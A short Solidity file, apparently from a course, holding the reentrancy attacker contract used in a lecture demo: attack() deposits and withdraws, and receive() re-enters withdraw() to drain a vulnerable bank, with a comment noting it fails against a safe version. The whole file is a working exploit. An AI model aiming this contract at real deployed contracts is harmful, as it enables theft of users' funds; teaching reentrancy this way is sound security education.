// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// The exploit used in the Lecture 2.14 demo. Deploy it pointing at a bank, fund it with
// one stake, and call attack(). Against VulnerableBank the receive() re-enters withdraw()
// and drains the pot; against SafeBank the re-entrant call reverts and the attack fails.

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IBank public immutable target;
    uint256 public looted;

    constructor(IBank _target) payable {
        target = _target;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();          // triggers the re-entry chain
    }

    receive() external payable {
        looted += msg.value;
        // re-enter only while the bank still holds ether
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
    }
}
